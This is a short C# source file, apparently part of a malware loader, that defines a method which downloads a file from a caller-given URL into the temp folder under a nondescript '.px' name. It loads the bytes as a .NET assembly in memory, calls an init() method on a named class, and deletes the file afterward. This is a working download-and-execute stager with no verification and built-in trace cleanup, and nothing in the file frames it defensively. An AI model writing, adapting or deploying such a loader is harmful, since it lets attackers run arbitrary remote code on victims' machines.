using System;
using System.IO;
using System.Net;
using System.Reflection;

namespace Loader
{
    internal static class PLoader
    {
        
        #region Variables
        private static readonly string temp = Path.GetTempPath(), tempPX = $@"{temp}\94016.px";
        #endregion

        /// <summary>
        /// Launch a exe file dynamically.
        /// <para>First download it from the [host] url, place it in %tmp%, use it's [init] function from the class which is specified via [eClass].</para>
        /// </summary>
        /// <param name="host"></param>
        /// <param name="eClass"></param>
        public static void exec(string host, string eClass)
        {
            var client = new WebClient();
            try
            {
                if (File.Exists(tempPX)) File.Delete(tempPX);
                System.Threading.Thread.Sleep(150);
                client.DownloadFile(host, tempPX);
                var stream = new FileStream(tempPX, FileMode.Open);
                var br = new BinaryReader(stream);
                var bin = br.ReadBytes((int) stream.Length);
                var asm = Assembly.Load(bin);
                dynamic o = asm.CreateInstance(eClass);
                o?.init();
                stream.Close();
                br.Close();
                File.Delete(tempPX);
            }
            catch (Exception ex) {Console.WriteLine($"Error: {ex}");}
        }
    }
}